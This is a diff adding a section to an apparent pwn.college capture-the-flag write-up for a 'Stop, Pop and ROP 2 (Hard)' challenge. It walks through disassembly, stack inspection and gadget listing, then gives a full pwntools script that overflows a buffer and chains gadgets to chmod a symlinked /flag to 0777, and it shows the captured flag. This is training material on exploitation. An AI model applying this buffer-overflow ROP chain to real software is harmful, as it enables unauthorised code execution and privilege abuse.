@@ -3203,3 +3203,316 @@ $
 hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ cat /flag 
 pwn.college{syRIf9w4Ac-DZiTHGLOc-VI3lcE.0VO0MDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## Stop, Pop and ROP 2 (Hard)
+
+```
+hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ /challenge/stop-pop-and-rop2-hard 
+###
+### Welcome to /challenge/stop-pop-and-rop2-hard!
+###
+
+```
+
+We need the following to craft our exploit:
+- [ ] Location of the buffer 
+- [ ] Location of the stored return address to `main()`
+- [ ] Location of a NULL terminated string
+
+Let's get the string addres first.
+
+```
+hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:/$ objdump -s -j .rodata /challenge/stop-pop-and-rop2-hard | grep -E "[0-9a-f]{2}00"
+ 403000 01000200 4c656176 696e6721 00232323  ....Leaving!.###
+ 403030 2100                                 !.    
+```
+
+- [ ] Location of the buffer 
+- [ ] Location of the stored return address to `main()`
+- [x] Location of a NULL terminated string: `0x403030`
+
+### Binary Analysis
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x000000000040205e <+0>:     endbr64
+   0x0000000000402062 <+4>:     push   rbp
+   0x0000000000402063 <+5>:     mov    rbp,rsp
+   0x0000000000402066 <+8>:     sub    rsp,0x60
+   0x000000000040206a <+12>:    mov    DWORD PTR [rbp-0x44],edi
+   0x000000000040206d <+15>:    mov    QWORD PTR [rbp-0x50],rsi
+   0x0000000000402071 <+19>:    mov    QWORD PTR [rbp-0x58],rdx
+   0x0000000000402075 <+23>:    lea    rax,[rbp-0x40]
+   0x0000000000402079 <+27>:    mov    edx,0x1000
+   0x000000000040207e <+32>:    mov    rsi,rax
+   0x0000000000402081 <+35>:    mov    edi,0x0
+   0x0000000000402086 <+40>:    call   0x4010b0 <read@plt>
+   0x000000000040208b <+45>:    mov    DWORD PTR [rbp-0x4],eax
+   0x000000000040208e <+48>:    lea    rdi,[rip+0xf6f]        # 0x403004
+   0x0000000000402095 <+55>:    call   0x401090 <puts@plt>
+   0x000000000040209a <+60>:    nop
+   0x000000000040209b <+61>:    leave
+   0x000000000040209c <+62>:    ret
+End of assembler dump.
+```
+
+Let's set a breakpoint at `challenge+40` and run.
+
+```
+pwndbg> break *(challenge+40)
+Breakpoint 1 at 0x402086
+```
+
+```
+pwndbg> run
+Starting program: /challenge/stop-pop-and-rop2-hard 
+###
+### Welcome to /challenge/stop-pop-and-rop2-hard!
+###
+
+
+Breakpoint 1, 0x0000000000402086 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffdc51a0330 —▸ 0x79070348f4a0 (_IO_file_jumps) ◂— 0
+ RBX  0x402160 (__libc_csu_init) ◂— endbr64 
+ RCX  0x7ffdc51a0498 —▸ 0x7ffdc51a1661 ◂— '/challenge/stop-pop-and-rop2-hard'
+ RDX  0x1000
+ RDI  0
+ RSI  0x7ffdc51a0330 —▸ 0x79070348f4a0 (_IO_file_jumps) ◂— 0
+ R8   0
+ R9   0x32
+ R10  0x4004e9 ◂— 0x66756276746573 /* 'setvbuf' */
+ R11  0x79070332ace0 (setvbuf) ◂— endbr64 
+ R12  0x4010d0 (_start) ◂— endbr64 
+ R13  0x7ffdc51a0490 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffdc51a0370 —▸ 0x7ffdc51a03a0 ◂— 0
+ RSP  0x7ffdc51a0310 ◂— 0
+ RIP  0x402086 (challenge+40) ◂— call read@plt
+────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x402086 <challenge+40>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/0)
+        buf: 0x7ffdc51a0330 —▸ 0x79070348f4a0 (_IO_file_jumps) ◂— 0
+        nbytes: 0x1000
+ 
+   0x40208b <challenge+45>    mov    dword ptr [rbp - 4], eax
+   0x40208e <challenge+48>    lea    rdi, [rip + 0xf6f]           RDI => 0x403004 ◂— 'Leaving!'
+   0x402095 <challenge+55>    call   puts@plt                    <puts@plt>
+ 
+   0x40209a <challenge+60>    nop    
+   0x40209b <challenge+61>    leave  
+   0x40209c <challenge+62>    ret    
+ 
+   0x40209d <main>            endbr64 
+   0x4020a1 <main+4>          push   rbp
+   0x4020a2 <main+5>          mov    rbp, rsp
+   0x4020a5 <main+8>          sub    rsp, 0x20
+──────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffdc51a0310 ◂— 0
+01:0008│-058     0x7ffdc51a0318 —▸ 0x7ffdc51a04a8 —▸ 0x7ffdc51a1683 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-050     0x7ffdc51a0320 —▸ 0x7ffdc51a0498 —▸ 0x7ffdc51a1661 ◂— '/challenge/stop-pop-and-rop2-hard'
+03:0018│-048     0x7ffdc51a0328 ◂— 0x100000000
+04:0020│ rax rsi 0x7ffdc51a0330 —▸ 0x79070348f4a0 (_IO_file_jumps) ◂— 0
+05:0028│-038     0x7ffdc51a0338 —▸ 0x79070333453d (_IO_file_setbuf+13) ◂— test rax, rax
+06:0030│-030     0x7ffdc51a0340 —▸ 0x7907034936a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+07:0038│-028     0x7ffdc51a0348 —▸ 0x79070332ade5 (setvbuf+261) ◂— xor r8d, r8d
+────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x402086 challenge+40
+   1         0x402142 main+165
+   2   0x7907032ca083 __libc_start_main+243
+   3         0x4010fe _start+46
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of the buffer: `0x7ffdc51a0330`
+- [ ] Location of the stored return address to `main()`
+- [x] Location of a NULL terminated string: `0x403030`
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffdc51a0380:
+ rip = 0x402086 in challenge; saved rip = 0x402142
+ called by frame at 0x7ffdc51a03b0
+ Arglist at 0x7ffdc51a0370, args: 
+ Locals at 0x7ffdc51a0370, Previous frame's sp is 0x7ffdc51a0380
+ Saved registers:
+  rbp at 0x7ffdc51a0370, rip at 0x7ffdc51a0378
+```
+
+- [x] Location of the buffer: `0x7ffdc51a0330`
+- [x] Location of the stored return address to `main()`: `0x7ffdc51a0378`
+- [x] Location of a NULL terminated string: `0x403030`
+
+Finally let's take a look at the ROP gadgets.
+
+
+```
+hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:/$ ROPgadget --binary /challenge/stop-pop-and-rop2-hard 
+Gadgets information
+============================================================
+0x00000000004010fd : add ah, dh ; nop ; endbr64 ; ret
+0x000000000040112b : add bh, bh ; loopne 0x401195 ; nop ; ret
+0x000000000040203a : add byte ptr [rax - 0x39], cl ; fadd dword ptr [r9 + 0x5a] ; ret
+0x0000000000402032 : add byte ptr [rax - 0x39], cl ; loopne 0x402092 ; ret
+0x00000000004021cc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
+0x000000000040214f : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
+0x0000000000402150 : add byte ptr [rax], al ; add cl, cl ; ret
+0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
+0x000000000040119a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x00000000004021ce : add byte ptr [rax], al ; endbr64 ; ret
+0x00000000004010fc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
+0x0000000000402151 : add byte ptr [rax], al ; leave ; ret
+0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
+0x000000000040119b : add byte ptr [rcx], al ; pop rbp ; ret
+0x0000000000401199 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x00000000004010fb : add byte ptr ds:[rax], al ; hlt ; nop ; endbr64 ; ret
+0x0000000000402152 : add cl, cl ; ret
+0x000000000040112a : add dil, dil ; loopne 0x401195 ; nop ; ret
+0x0000000000401038 : add dl, dh ; jmp 0x401020
+0x000000000040119c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x0000000000401197 : add eax, 0x3ecb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x0000000000401017 : add esp, 8 ; ret
+0x0000000000401016 : add rsp, 8 ; ret
+0x0000000000402099 : call qword ptr [rax + 0xff3c3c9]
+0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
+0x0000000000401014 : call rax
+0x000000000040201e : clc ; pop r8 ; ret
+0x00000000004011b3 : cli ; jmp 0x401140
+0x0000000000401103 : cli ; ret
+0x00000000004021db : cli ; sub rsp, 8 ; add rsp, 8 ; ret
+0x00000000004011b0 : endbr64 ; jmp 0x401140
+0x0000000000401100 : endbr64 ; ret
+0x000000000040203d : fadd dword ptr [r9 + 0x5a] ; ret
+0x000000000040203e : fadd dword ptr [rcx + 0x5a] ; ret
+0x00000000004021ac : fisttp word ptr [rax - 0x7d] ; ret
+0x00000000004010fe : hlt ; nop ; endbr64 ; ret
+0x0000000000401012 : je 0x401016 ; call rax
+0x0000000000401125 : je 0x401130 ; mov edi, 0x405050 ; jmp rax
+0x0000000000401167 : je 0x401170 ; mov edi, 0x405050 ; jmp rax
+0x000000000040103a : jmp 0x401020
+0x00000000004011b4 : jmp 0x401140
+0x000000000040100b : jmp 0x4840104f
+0x000000000040112c : jmp rax
+0x000000000040209b : leave ; ret
+0x000000000040112d : loopne 0x401195 ; nop ; ret
+0x0000000000402036 : loopne 0x402092 ; ret
+0x0000000000401196 : mov byte ptr [rip + 0x3ecb], 1 ; pop rbp ; ret
+0x0000000000402054 : mov dword ptr [rbp - 0x40], 0xc35941 ; nop ; pop rbp ; ret
+0x000000000040214e : mov eax, 0 ; leave ; ret
+0x0000000000401127 : mov edi, 0x405050 ; jmp rax
+0x00000000004010ff : nop ; endbr64 ; ret
+0x000000000040209a : nop ; leave ; ret
+0x0000000000402009 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x000000000040200a : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x000000000040200b : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x000000000040200c : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x000000000040200d : nop ; nop ; nop ; nop ; pop rbp ; ret
+0x000000000040200e : nop ; nop ; nop ; pop rbp ; ret
+0x000000000040200f : nop ; nop ; pop rbp ; ret
+0x0000000000402010 : nop ; pop rbp ; ret
+0x000000000040112f : nop ; ret
+0x00000000004011ac : nop dword ptr [rax] ; endbr64 ; jmp 0x401140
+0x0000000000401126 : or dword ptr [rdi + 0x405050], edi ; jmp rax
+0x000000000040203f : pop r10 ; ret
+0x00000000004021bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004021be : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004021c0 : pop r14 ; pop r15 ; ret
+0x00000000004021c2 : pop r15 ; ret
+0x000000000040201f : pop r8 ; ret
+0x0000000000402057 : pop r9 ; ret
+0x0000000000402020 : pop rax ; ret
+0x00000000004021bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004021bf : pop rbp ; pop r14 ; pop r15 ; ret
+0x000000000040119d : pop rbp ; ret
+0x0000000000402058 : pop rcx ; ret
+0x0000000000402047 : pop rdi ; ret
+0x0000000000402037 : pop rdx ; ret
+0x00000000004021c1 : pop rsi ; pop r15 ; ret
+0x0000000000402027 : pop rsi ; ret
+0x00000000004021bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000401129 : push rax ; add dil, dil ; loopne 0x401195 ; nop ; ret
+0x0000000000401128 : push rax ; push rax ; add dil, dil ; loopne 0x401195 ; nop ; ret
+0x000000000040101a : ret
+0x0000000000401198 : retf
+0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
+0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
+0x00000000004021dd : sub esp, 8 ; add rsp, 8 ; ret
+0x00000000004021dc : sub rsp, 8 ; add rsp, 8 ; ret
+0x000000000040204f : syscall
+0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
+0x0000000000401123 : test eax, eax ; je 0x401130 ; mov edi, 0x405050 ; jmp rax
+0x0000000000401165 : test eax, eax ; je 0x401170 ; mov edi, 0x405050 ; jmp rax
+0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
+
+Unique gadgets found: 93
+```
+
+### ROP chain
+
+The ROP chain will be the same as the [easy version](#rop-chain-5).
+
+### Exploit
+
+```
+hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ ln -sf /flag ~/!
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Initialize values
+pop_rax_ret_gadget = 0x402020
+pop_rdi_ret_gadget = 0x402047
+pop_rsi_pop_r15_ret_gadget = 0x4021c1
+syscall_gadget = 0x40204f
+bang_addr = 0x403030
+
+buffer_addr = 0x7ffdc51a0330
+ret_addr = 0x7ffdc51a0378
+
+# Calculate offset
+const_offset = ret_addr - buffer_addr
+
+p = process('/challenge/stop-pop-and-rop2-hard')
+
+# Craft payload
+payload = b"A" * const_offset
+payload += p64(pop_rdi_ret_gadget)
+payload += p64(bang_addr)         
+payload += p64(pop_rsi_pop_r15_ret_gadget)
+payload += p64(0o777)  
+payload += b"B" * 8              
+payload += p64(pop_rax_ret_gadget)
+payload += p64(90)                  
+payload += p64(syscall_gadget)
+
+# Send the payload
+p.sendline(payload)
+p.interactive()
+```
+
+```
+hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ python ~/script.py
+[+] Starting local process '/challenge/stop-pop-and-rop2-hard': pid 13446
+[*] Switching to interactive mode
+[*] Process '/challenge/stop-pop-and-rop2-hard' stopped with exit code -11 (SIGSEGV) (pid 13446)
+###
+### Welcome to /challenge/stop-pop-and-rop2-hard!
+###
+
+Leaving!
+[*] Got EOF while reading in interactive
+$  
+```
+
+```
+hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ cat /flag 
+pwn.college{0dY0MtDlT_gkfSSrek3AId3RaXP.0FM1MDL4ITM0EzW}
+```
